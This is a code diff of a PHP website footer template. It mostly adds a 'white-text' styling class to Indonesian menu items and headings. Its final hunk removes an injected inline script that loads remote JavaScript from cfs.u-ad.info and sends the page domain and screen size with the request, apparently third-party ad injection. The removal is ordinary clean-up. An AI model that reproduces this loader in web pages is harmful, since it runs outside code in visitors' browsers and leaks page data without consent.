@@ -12,15 +12,15 @@
                         
                             <li class="widget-container widget_nav_menu"><!-- widgets list -->
                     
-                                <h1 class="title-widget">Navigasi</h1>                                
+                                <h1 class="title-widget white-text">Navigasi</h1>                                
                                 <ul>
-                                    <li><a href="<?php echo base_url('profil/harga');?>" title="menu item">Daftar Harga</a></li>
-                                    <li><a href="<?php echo base_url('profil/klien');?>" title="menu item">Daftar Klien</a></li>
-                                    <li><a href="<?php echo base_url('produk');?>" title="menu item">Produk Kami</a></li>
-                                    <li><a href="<?php echo base_url('galeri');?>" title="menu item">Album Foto</a></li>
-                                    <li><a href="<?php echo base_url('blog');?>" title="menu item">Blog</a></li>
-                                    <li><a href="<?php echo base_url('download');?>" title="menu item">Download File</a></li>
-                                    <li><a href="<?php echo base_url('kontak');?>" title="menu item">Kontak</a></li>
+                                    <li><a  href="<?php echo base_url('profil/harga');?>" title="menu item"><div class="white-text">Daftar Harga</div></a></li>
+                                    <li><a href="<?php echo base_url('profil/klien');?>" title="menu item"><div class="white-text">Daftar Klien</div></a></li>
+                                    <li><a href="<?php echo base_url('produk');?>" title="menu item"><div class="white-text">Produk Kami</div></a></li>
+                                    <li><a href="<?php echo base_url('galeri');?>" title="menu item"><div class="white-text">Album Foto</div></a></li>
+                                    <li><a href="<?php echo base_url('blog');?>" title="menu item"><div class="white-text">Blog</div></a></li>
+                                    <li><a href="<?php echo base_url('download');?>" title="menu item"><div class="white-text">Download File</div></a></li>
+                                    <li><a href="<?php echo base_url('kontak');?>" title="menu item"><div class="white-text">Kontak</div></a></li>
                                 </ul>
                     
                             </li>
@@ -39,11 +39,11 @@
                         
                             <li class="widget-container widget_recent_news"><!-- widgets list -->
                     
-                                <h1 class="title-widget"><?php echo $site['nameweb'];?> Kontak</h1>
+                                <h1 class="title-widget white-text"><?php echo $site['nameweb'];?> Kontak</h1>
                                 
                                 <div itemscope itemtype=""> 
                                 
-                                    <h2 class="title-median m-contact-subject" itemprop="name">Kantor <?php echo $site['nameweb'];?></h2>
+                                    <h2 class="title-median m-contact-subject white-text" itemprop="name">Kantor <?php echo $site['nameweb'];?></h2>
                                 
                                     <div class="m-contact-address" itemprop="address" itemscope itemtype="">
                                         <span class="m-contact-street" itemprop="street-address"><?php echo $site['address'];?></span>
@@ -85,7 +85,7 @@
                         
                             <li class="widget-container widget_sofa_flickr"><!-- widgets list -->
                     
-                                <h1 class="title-widget">Album Foto</h1>
+                                <h1 class="title-widget white-text">Album Foto</h1>
                                 
                                 <ul class="k-flickr-photos list-unstyled">
                                 <?php
@@ -118,7 +118,7 @@
             
                 <div class="col-lg-12">
                     <center>
-                    <p class="copy-text text-inverse">
+                    <p class="copy-text text-inverse white-text">
                     &copy; 2017 <?php echo $site['nameweb'];?>
                     </p>
                     </center>
@@ -160,5 +160,5 @@
     <!-- Theme -->
     <script src="<?php echo base_url();?>assets/front/js/theme.js"></script>
     
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b5jiDvLTPqup5xyIT%2fGS0C8zoI%2fzA4pMbYDHJYABu%2bRDoHthnRYvwh6YBiANi0NKxvDk7nuzxEh6HBrGli8HoBIHCXbLOg8Yk036s6XYq7tyWvaJeTJaBtE9FSmvNIIgx7aYSMNSBGlSnyEIuKLVUWnsnEnRyrrXxNFgTijAlPYpufYsXL2cI5EjtSwJ8%2bQZqTE9B404hKiPql0T%2fsMnBATr%2fgvqd6xsJdnSrLlWleSMlRAzRzOCMuRtae%2byV3hEHXlK71qqKPpXnOPIBIR6miQ58xa0xl2V79Oc2dM8YimTwZHlQ3SJlyEbkFE%2fSbaqYwXCq5gRjPZrb9TNL8FqgSvQyUyaEDGlVjjF%2fvCNcJ2iL1r8M7n1qY4mRSBNWRta6140fEF05XSybqBMquSpYx%2fLZgM1Gzd9Tgi4CaBQgU1GmaPf1nMyU3rbLGVu2GD%2fjMgffNz%2f5AbrU6KWd%2bfQjqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+ </body>
 </html>
